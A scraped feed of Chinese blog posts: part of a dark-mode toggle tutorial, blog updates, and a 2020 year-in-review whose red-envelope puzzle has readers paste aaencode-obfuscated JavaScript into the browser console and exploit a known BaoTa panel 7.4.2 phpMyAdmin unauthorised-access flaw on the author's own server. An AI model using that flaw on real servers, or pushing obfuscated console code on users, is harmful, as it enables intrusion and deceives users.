class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 